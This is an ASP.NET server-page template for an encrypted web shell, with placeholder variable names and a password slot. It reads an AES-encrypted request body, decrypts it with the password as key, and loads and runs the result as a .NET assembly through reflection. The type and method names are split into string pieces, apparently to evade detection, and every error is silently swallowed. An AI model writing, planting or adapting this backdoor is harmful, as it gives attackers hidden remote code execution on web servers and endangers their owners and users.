<%
try{Response.StatusCode = 302;Session["{stryi}"] = "<<<PASSWORD>>>";
byte[] {strer} = System.Text.Encoding.Default.GetBytes(Session["{stryi}"].ToString());
byte[] {strsan} = Request.BinaryRead(Request.TotalBytes);
var {strsi} = new System.Security.Cryptography.AesManaged();
var {strwu} = {strsi}.CreateDecryptor({strer}, {strer});
byte[] {strshiyi} = {strwu}.TransformFinalBlock({strsan}, 0, {strsan}.Length);
string {strliu} = "System." + "Reflection." + "Assembly";string {strqi} = "Lo" + "ad";
var {strba} = Type.GetType({strliu});
var {strjiu} = {strba}.GetMethod({strqi}, new Type[] { typeof(byte[]) }).Invoke(null, new object[] { {strshiyi} });
((System.Reflection.Assembly){strjiu}).CreateInstance("U").Equals(this);}catch { }
%><% @language="c#" %>